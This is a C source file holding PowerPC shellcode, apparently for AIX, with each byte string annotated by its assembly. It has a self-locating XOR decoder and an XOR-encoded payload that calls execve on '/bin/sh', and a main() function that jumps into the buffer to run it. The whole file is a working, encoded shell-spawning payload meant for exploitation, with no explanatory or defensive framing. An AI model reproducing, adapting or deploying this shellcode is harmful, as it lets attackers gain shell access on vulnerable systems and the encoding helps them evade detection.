char shellcode[] =
// decoder
"\x7c\xa5\x2a\x79"      //  xor.    %r5, %r5, %r5
"\x40\x82\xff\xfd"      //  bnel    .main
"\x7c\x68\x02\xa6"      //  mflr    %r3
"\x38\x63\x01\x01"      //  addi    %r3, %r3, 0x101
"\x38\x63\xff\x2e"      //  addi    %r3, %r3, -0xDA     # r3 point start of real shellcode-1
"\x39\x20\x01\x01"      //  li      %r9, 0x101
"\x39\x29\xff\x23"      //  addi    %r9, %r9, -0xDD     # shellcode size+1
"\x7c\xc9\x18\xae"      //  lbzx    %r6, %r9, %r3       # read a character
"\x68\xc7\xfe\xfe"      //  xori    %r7, %r6, 0xFEFE    # xor
"\x7c\xe9\x19\xae"      //  stbx    %r7, %r9, %r3       # store a character
"\x35\x29\xff\xff"      //  subic.  %r9, %r9, 1
"\x40\x82\xff\xf0"      //  bne     Loop                # loop

"\x7c\x00\x04\xac"      //  sync
"\x4c\x00\x01\x2c"      //  isync

// real shellcode
"\xc6\x9d\xfe\xe3"      //  addi    %r3, %r3, 29
"\x6e\x9f\x01\x06"      //  stw     %r3, -8(%r1)
"\x6e\x5f\x01\x02"      //  stw     %r5, -4(%r1)
"\xc6\x7f\x01\x06"      //  subi    %r4, %r1, 8
"\xc6\xbe\xfe\xfb"      //  li      %r2, 5
"\xb2\x38\xcd\xbc"      //  crorc   %cr6, %cr6, %cr6
"\xba\xfe\xfe\xfc"      //  svca    0
"\xd1\x9c\x97\x90"      //  .byte   '/', 'b', 'i', 'n',
"\xd1\x8d\x96\xfe"      //          '/', 's', 'h', 0x0
;

int main() {
  int jump[2]={(int)shellcode,0};
  ((*(void (*)())jump)());
}
